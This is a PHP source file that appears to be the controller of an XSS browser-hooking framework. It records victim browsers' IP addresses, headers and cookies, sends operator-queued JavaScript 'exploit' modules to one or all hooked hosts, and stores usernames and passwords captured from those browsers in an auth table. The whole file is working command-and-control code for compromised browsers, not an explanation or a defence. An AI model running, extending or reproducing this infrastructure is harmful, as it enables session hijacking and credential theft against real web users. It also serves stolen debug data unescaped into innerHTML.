<?php 
// include the configuration file
require '../config.php';
// our log file
$log = Logger::getLogger("app");


/**
 * match a useragent against a unique browser type
 */
function match_browser($agent) {
	foreach (array("chrome", "firefox", "msie", "opera", "safari", "mozilla") as $b) {
		if (stristr($agent, $b)) { return $b; }
	}
	return "unknown";
}

/**
 * match a useragent against a unique os type
 */
function match_os($agent) {
	foreach (array("linux", "android", "macintosh", "windows", "ipad", "iphone", "iod", "bsd") as $o) {
		if (stristr($agent, $o)) { return $o; }
	}
	return "unknown";
}

/**
 * create a new host.  New hosts are created based on IP,Browser,OS.
 * if a client connects with existing IP,Browser,OS we will just update
 * the guid for them.   This could be a problem if you have a lot of
 * machines behind NAT.
 *
 * called on registration, and if we are unable to locate an session.
 * return the host id
 */
function create_host($db, $guid, $cookies) {
	$log = Logger::getLogger("app");
	$agent = $_SERVER['HTTP_USER_AGENT'];
	$ip = $_SERVER['REMOTE_ADDR'];
	$headers = join(", ", apache_request_headers());
	$os = match_os($agent);
	$browser = match_browser($agent);
	$cachekey ="host{$ip}{$browser}{$os}";

	$log->trace("create host. agent:($agent)  match[$os : $browser]");

	// reuse the host if ip, browser and os match.  then update the session guid
	if (REUSE_HOST) {
		// try to find the host in the DB (or cache)
		$host = cache_get($cachekey);
		if (!$host) {
			$host = $db->select("find host", "SELECT * FROM host", array("remote_ip" => $ip, 'browser' => $browser, 'os' => $os));
		}

		// does the host already exist? update, guid and cookies
		if (isset($host[0])) {
			// values with ! are treated as literals and are not escaped or quoted
			$db->update("update host", "host", array('guid'=>$guid, 'cookies' => $cookies, 'heartbeat' => "!CURRENT_TIMESTAMP"), array("remote_ip" => $ip, 'browser' => $browser, 'os' => $os));
			$host['guid'] = $guid;
			$host['cookies'] = $cookies;
			cache_set($cachekey, $host);
			cache_set("guid{$guid}", $host);
			return $host[0]['id'];
		}
	}

	// does not exit, create a new host entry
	$id = $db->insert("create host", "host", array('id' => null, 'remote_ip' => $ip, 'agent' => $agent, 'headers' => $headers, 'inject_source' => $_SERVER['HTTP_REFERER'], 'cookies' => $cookies, 'guid' => $guid, 'browser' => $browser, 'os' => $os, 'heartbeat' => '!CURRENT_TIMESTAMP'));


	cache_set($cachekey, array('id'=>$id, 'remote_ip'=>$ip, 'agent'=>$agent, 'headers'=>$headers, 'inject_source'=>$_SERVER['HTTP_REFERER'], 'cookies'=>$cookies, 'guid'=>$guid, 'browser'=>$browser, 'os'=>$os, 'heartbeat'=>'now'));

	$res = cache_set("cmd{$guid}", true);
	return $id;
}

/**
 * Run commands for the connected browser if any exist
 */
function run_commands($db, $guid) {
	// do we have a command to run?
	$rows = cache_get("cmd{$guid}");
	if ($rows == false)
		$rows = $db->select("check command", "SELECT * FROM commands", array("guid" => $guid));

	if (isset($rows[0])) {
		$log = Logger::getLogger("app");
		foreach ($rows as $row) {
			$foo = parse_url($row['command']);

			// log what we are about to do
			$log->info("run {$foo['path']} ({$foo['query']})");
			
			// .js or .php file?
			$parts = explode(".", trim($foo["path"]));
			$tpath = MODULE_DIR.$parts[0];

			// run the module code (print out the JS)
			if (file_exists("{$tpath}.js")) {
				$params = get_params("{$tpath}.js");

				echo "var xssgbl = Array();\n";
				foreach($params as $name => $param) {

					// set the parameter to the default
					$val = $param[1];
					// search for a parameter in this command
					if (preg_match("/$name=([^&]+)/", $foo["query"], $matches)) {
						// use the command value
						$val = urldecode($matches[1]);
					}
					echo "xssgbl['$name'] = '$val';\n";
				}
				require("{$tpath}.js");
			}

			// don't remove autorun commands
			if ($guid != "AUTORUN") {
				$db->delete("remove executed command", "commands", array("id" => $row['id']));
			}
			$db->insert("audit command", "audit", array("guid" => $guid, "command" => $row['command'], "id" => null));
		}
	}
}

function do_heartbeat($db, $guid) {
	$log = Logger::getLogger("heartbeat");

	// find the host
	$host =	cache_get("guid{$guid}");
	if (!$host)
		$host = $db->select("get host", "SELECT * FROM host", array("guid" => $guid));

	// ensure we have a host
	if (!isset($host[0])) {
		$log->error("NO SUCH HOST!");
		$id = create_host($db, $guid, "null");
		$host = $db->select("get host", "SELECT * FROM host", array("guid" => $id));
	}
	// update the heartbeat time.  TODO: web scale this shiz!  Needs to be cache only
	else {
		$db->update("update heart beat", "host", array("heartbeat" => "!CURRENT_TIMESTAMP"), array("guid" => $guid));
		// add debug log
		if (isset($guid) && strlen($_GET['d']) > 1) { $db->insert("log debug", "debug_log", array("guid" => $guid, "log" => $_GET['d'])); }
		run_commands($db, $_GET['id']);
		exit;
	}

	// do we have login creds ?
	// todo: move this to a module
	if (isset($_GET['u'])) {
		$id = $db->insert("create auth", "auth", array('id' => null, 'host_id' => $host[0]['id'], 'domain' => $_SERVER['HTTP_REFERER'], 
			'user' => $_GET['u'], 'pass' => $_GET['p']));
	}
}

function list_hosts($db) {
	$rows = $db->select("get hosts", "SELECT *, 'active' as class FROM host", array("heartbeat > " => "!subtime(CURRENT_TIMESTAMP, '0:0:30')"));
	$rows2 = $db->select("get hosts", "SELECT *, 'inactive' as class FROM host", array("heartbeat < " => "!subtime(CURRENT_TIMESTAMP, '0:0:30')"));

	//print_r($rows);
	echo "host_list = " . json_encode(array_merge($rows, $rows2)) . ";\n";
	echo "update_list(); xsscls();";
}

try {
	// TODO: use localcache so we don't need a DB connection unless writing
	// we will need a db connection
	$db = DB::getConnection(DB_HOST, DB_USER, DB_PASS, DB_NAME);


	/******************
	 * PUBLIC METHODS
	 *****************/
	// register new hosts
	if (isset($_GET['reg'])) {
		create_host($db, $_GET['reg'], ($_GET['c']) ? $_GET['c'] : "null");
		run_commands($db, "AUTORUN");

		// setup the heartbeat
		$heartbeat=IDLE_POLL;
		require("../modules/heartbeat.php");
		exit;
	}

	// heart beats. debug logs. command execution
	if (isset($_GET['id'])) {
		do_heartbeat($db, $_GET['id']);
	}

	/******************
	 * PRIVATE METHODS
	 *****************/
	if (!isset($_GET["A"]))
		die("no action");

	if ($_GET['auth'] != PASSWORD) {
		$log->error("incorrect auth [ " . $_GET['auth'] . "]");
		die("require auth");
	}

	// create an array with all of the parameters
	$data = array();
	foreach ($_GET as $param => $value) {
		if ($param != "A" && $param != 'auth' && $param != 'table')
			$data[$param] = $value;
	}



	if ($_GET["A"] == "list") {
		list_hosts($db);
	}

	if ($_GET["A"] == "exploit") { 
		$command = "{$_GET['payload']}.php?".$_SERVER['QUERY_STRING'];
		if ($_GET['target'] == "ALL") {
			$rows = $db->select("get hosts", "SELECT *, 'active' as class FROM host", array("heartbeat > " => "!subtime(CURRENT_TIMESTAMP, '0:0:15')"));
			foreach ($rows as $row) {
				$db->insert("add command", "commands", array("guid" => $row['guid'], "command" => $command, "id" => null));
			}
		}
		else {
			$db->insert("add command", "commands", array("guid" => $_GET['target'], "command" => $command, "id" => null));
		}
	}
	if ($_GET["A"] == "debug") { 
		$rows = $db->select("get hosts", "SELECT id, log FROM debug_log", array("guid" => $_GET['guid']));
		$log = "<hr /><dl>";
		foreach ($rows as $r) {
			$log .= "<dt>".$r['id']."</dt>";
			$log .= "<dd>".$r['log']."</dt>";
			//$log .= str_replace("%A0", " / ", $r['log']) . "<br />";
		}
		$log .= "</dl>";

		echo "document.getElementById('out_debug').innerHTML = '$log'; xsscls(); ";
	}

	if ($_GET["A"] == "modules") {

		//$rows = $db->select("get hosts", "SELECT log FROM debug_log", array("guid" => $_GET['guid']));
		$modules = array();
		foreach (glob(MODULE_DIR."*.js") as $module) {
			$modules[] = get_params($module);
		}
		echo "module_list = " . json_encode($modules) . ";\n";
		echo "update_modules(); xsscls();";
	}
	

} catch(Exception $e) {
	echo "<pre>";
	debug_print_backtrace();
	die ($e);
}

/**
 * read the JavaScript module and return it's parameters
 */
function get_params($file) {
	$lines = file_get_contents($file);
	$parts = explode('/', $file);

	preg_match_all("/xssopt\s*\(['\"]([^'\"]+)['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*,\s*['\"]([^'\"]+)/", $lines, $matches);
	$module = array();

	for($i=0,$l=count($matches[0]);$i<$l;$i++) {
		$module[$matches[1][$i]] = array($matches[2][$i], $matches[3][$i]);
	}
	return $module;
}

function cache_get($key) {
	if (CACHE == 'APC')
		return apc_fetch($key);
	return false;
}

function cache_set($key, $value) {
	// cache for 10 minutes 
	if (CACHE == 'APC')
		return apc_store($key, $value, 600);
	return false;
}

?>
